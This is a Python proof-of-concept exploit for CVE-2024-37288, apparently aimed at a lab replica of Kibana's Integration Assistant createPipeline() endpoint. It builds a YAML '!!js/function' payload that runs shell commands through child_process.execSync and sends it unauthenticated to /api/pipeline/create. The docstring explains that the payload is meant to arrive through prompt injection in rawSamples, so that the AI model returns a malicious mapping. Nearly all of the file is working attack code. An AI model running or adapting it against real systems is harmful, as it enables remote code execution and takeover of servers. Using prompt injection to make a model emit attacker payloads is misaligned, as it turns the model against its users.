#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : CVE-2024-37288 — Kibana createPipeline() RCE (Network)
# Author         : Exploit Intelligence Platform
# Vendor         : Elastic
# Software       : Kibana 8.15.0
# CVE            : CVE-2024-37288
# CWE            : CWE-502 (Deserialization of Untrusted Data)
# CVSS           : 9.9 (CRITICAL)
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2024-37288 — Vector 2: Direct createPipeline() Code Path Exploitation (Network)

Calls the ACTUAL createPipeline() function from the Integration Assistant
plugin via HTTP, demonstrating the full vulnerable code path:

  attacker-influenced mapping → generateProcessors() → Nunjucks render → yaml.load() → RCE

The crafted state object simulates what happens when an AI model returns
a malicious ECS mapping (via prompt injection in rawSamples). The mapping
contains !!js/function YAML tags in the target field, which pass through
Nunjucks rendering (autoescape: false) and trigger code execution when
yaml.load() parses the rendered template.

PREREQUISITES:
  - Network access to the vulnerable API (default port 8080)
  - No authentication required

REFERENCES:
  - CVE-2024-37288
  - https://discuss.elastic.co/t/kibana-8-15-1-security-update-esa-2024-27-esa-2024-28/366119

Usage:
    python3 poc_vector2.py <target_host> <target_port>
    python3 poc_vector2.py localhost 8080
"""

import sys
import json
import http.client


def send_pipeline_state(target_host, target_port, state):
    """Send a crafted state object to /api/pipeline/create.

    Returns:
        tuple: (status_code, response_dict_or_string)
    """
    body = json.dumps(state)
    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=15)
        conn.request("POST", "/api/pipeline/create", body=body,
                     headers={"Content-Type": "application/json"})
        response = conn.getresponse()
        status = response.status
        resp_body = response.read().decode('utf-8', errors='replace')
        conn.close()
        try:
            return status, json.loads(resp_body)
        except json.JSONDecodeError:
            return status, resp_body
    except Exception as e:
        return None, str(e)


def make_malicious_state(command):
    """Construct a state object that triggers RCE through createPipeline().

    The key injection point is currentMapping.*.*.source_ip.target — this
    value contains a !!js/function YAML tag. When createPipeline() processes
    this state:
      1. generateProcessors() extracts the mapping and creates processor objects
      2. Nunjucks renders the pipeline.yml.njk template with autoescape: false
         — the !!js/function tag passes through unescaped
      3. yaml.load() parses the rendered YAML with DEFAULT_FULL_SCHEMA
         — the !!js/function tag creates a live JavaScript Function object
    """
    # The target value must contain actual newlines for the YAML block scalar
    # to work correctly after Nunjucks rendering
    target_value = (
        '!!js/function >\n'
        '        function() {\n'
        '          return require("child_process").execSync("'
        + command.replace('"', '\\"') +
        '").toString().trim();\n'
        '        }'
    )

    return {
        "rawSamples": ['{"source_ip": "192.168.1.1"}'],
        "samples": [{"source_ip": "192.168.1.1"}],
        "formattedSamples": '{"source_ip": "192.168.1.1"}',
        "packageName": "test_package",
        "dataStreamName": "test_stream",
        "ecsVersion": "8.11.0",
        "currentMapping": {
            "test_package": {
                "test_stream": {
                    "source_ip": {
                        "target": target_value,
                        "confidence": 0.99,
                        "type": "string",
                        "date_formats": []
                    }
                }
            }
        },
        "ecs": "{}"
    }


def exploit(target_host, target_port):
    """Run createPipeline() exploitation over HTTP."""
    print("=" * 70)
    print("  CVE-2024-37288 — createPipeline() Code Path Exploitation")
    print("  Vector: HTTP POST to /api/pipeline/create")
    print("=" * 70)
    print()

    # -----------------------------------------------------------------------
    # Step 1: Health check
    # -----------------------------------------------------------------------
    print(f"[*] Target: http://{target_host}:{target_port}")
    print("[*] Step 1: Checking target health...")

    try:
        conn = http.client.HTTPConnection(target_host, target_port, timeout=5)
        conn.request("GET", "/health")
        resp = conn.getresponse()
        health = json.loads(resp.read())
        conn.close()

        version = health.get("jsyaml_version", "unknown")
        pipeline_avail = health.get("createPipeline_available", False)
        print(f"[+] Target is UP — js-yaml v{version}")
        print(f"[*] createPipeline() available: {pipeline_avail}")

        if not pipeline_avail:
            print("[-] createPipeline() is not available on this target")
            print("    The Integration Assistant plugin module could not be loaded.")
            print("    Use poc.py (Vector 1) to demonstrate the yaml.load() primitive instead.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Cannot reach target: {e}")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Step 2: Execute commands via createPipeline() RCE
    # -----------------------------------------------------------------------
    print()
    print("[*] Step 2: Calling createPipeline() with attacker-influenced ECS mapping...")
    print("    Code path: generateProcessors() → Nunjucks render → yaml.load()")
    print()

    commands = ["id", "whoami", "cat /etc/hostname"]
    all_success = True

    for cmd in commands:
        print(f"  [*] RCE command: {cmd}")
        state = make_malicious_state(cmd)
        status, resp = send_pipeline_state(target_host, target_port, state)

        if status is None:
            print(f"  [-] Request failed: {resp}")
            all_success = False
            continue

        if isinstance(resp, dict) and resp.get("status") == "rce_via_createPipeline":
            findings = resp.get("findings", [])
            for f in findings:
                if f.get("type") == "function" and f.get("executed"):
                    print(f"  [+] RCE SUCCESS via createPipeline(): {f.get('output', '').strip()}")
                else:
                    print(f"  [*] Finding: {f}")
            proc_count = resp.get("processor_count", 0)
            print(f"      Pipeline processors: {proc_count}")
        elif isinstance(resp, dict) and resp.get("status") == "pipeline_created":
            print(f"  [-] Pipeline created but no function execution detected")
            all_success = False
        elif isinstance(resp, dict) and resp.get("status") == "error":
            print(f"  [-] Error: {resp.get('error', 'unknown')}")
            all_success = False
        else:
            print(f"  [-] Unexpected response (HTTP {status}): {resp}")
            all_success = False

    # -----------------------------------------------------------------------
    # Summary
    # -----------------------------------------------------------------------
    print()
    print("=" * 70)
    if all_success:
        print("[+] VULNERABILITY CONFIRMED via actual createPipeline() code path")
        print("[+] The Integration Assistant plugin's createPipeline() function")
        print("[+] deserializes attacker-influenced YAML with unsafe load(),")
        print("[+] creating executable JavaScript Function objects from")
        print("[+] !!js/function tags injected through AI model responses.")
    else:
        print("[-] EXPLOITATION INCOMPLETE — check output above")
    print("=" * 70)

    return 0 if all_success else 1


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

    sys.exit(exploit(target, port))
